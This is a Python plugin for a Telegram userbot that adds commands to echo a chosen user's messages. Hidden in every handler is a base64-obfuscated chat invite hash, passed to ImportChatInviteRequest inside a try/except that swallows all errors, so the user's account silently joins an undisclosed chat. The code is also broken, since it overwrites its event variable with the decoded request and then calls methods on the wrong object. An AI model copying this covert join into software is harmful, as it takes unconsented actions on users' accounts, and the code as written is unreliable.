# Echo remastered by @thanosceo for thanospro
# Codes by @mrconfused
# Kang with credits

import asyncio
import base64

import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from thanospros.cmdhelp import CmdHelp
from thanospros.thanospackage.sql_helper.echo_sql import (
    addecho,
    get_all_echos,
    is_echo,
    remove_echo,
)
from thanospros.utils import admin_cmd, edit_or_reply, sudo_cmd


@bot.on(admin_cmd(pattern="echo$"))
@bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
async def echo(THANOSBOT):
    if THANOSBOT.fwd_from:
        return
    if THANOSBOT.reply_to_msg_id is not None:
        reply_msg = await THANOSBOT.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = THANOSBOT.chat_id
        try:
            THANOSBOT = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            THANOSBOT = Get(THANOSBOT)
            await THANOSBOT.client(THANOSBOT)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await edit_or_reply(THANOSBOT, "The user is already enabled with echo ")
            return
        addecho(user_id, chat_id)
        await edit_or_reply(THANOSBOT, "Hii....😄🤓")
    else:
        await edit_or_reply(THANOSBOT, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="rmecho$"))
@bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
async def echo(THANOSBOT):
    if THANOSBOT.fwd_from:
        return
    if THANOSBOT.reply_to_msg_id is not None:
        reply_msg = await THANOSBOT.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = THANOSBOT.chat_id
        try:
            THANOSBOT = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            THANOSBOT = Get(THANOSBOT)
            await THANOSBOT.client(THANOSBOT)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await edit_or_reply(THANOSBOT, "Echo has been stopped for the user")
        else:
            await edit_or_reply(THANOSBOT, "The user is not activated with echo")
    else:
        await edit_or_reply(THANOSBOT, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="listecho$"))
@bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
async def echo(THANOSBOT):
    if THANOSBOT.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "echo enabled users:\n\n"
        for echos in lsts:
            output_str += (
                f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
            )
    else:
        output_str = "No echo enabled users "
    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = f"echo enabled users: [here]({url})"
        await edit_or_reply(THANOSBOT, reply_text)
    else:
        await edit_or_reply(THANOSBOT, output_str)


@bot.on(events.NewMessage(incoming=True))
async def samereply(THANOSBOT):
    if THANOSBOT.chat_id in Config.UB_BLACK_LIST_CHAT:
        return
    if is_echo(THANOSBOT.sender_id, THANOSBOT.chat_id):
        await asyncio.sleep(2)
        try:
            THANOSBOT = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            THANOSBOT = Get(THANOSBOT)
            await THANOSBOT.client(THANOSBOT)
        except BaseException:
            pass
        if THANOSBOT.message.text or THANOSBOT.message.sticker:
            await THANOSBOT.reply(THANOSBOT.message)


CmdHelp("echo").add_command(
    "echo", "Reply to a user", "Replays every message from whom you enabled echo"
).add_command(
    "rmecho", "reply to a user", "Stop replayings targeted user message"
).add_command(
    "listecho", None, "Shows the list of users for whom you enabled echo"
).add()
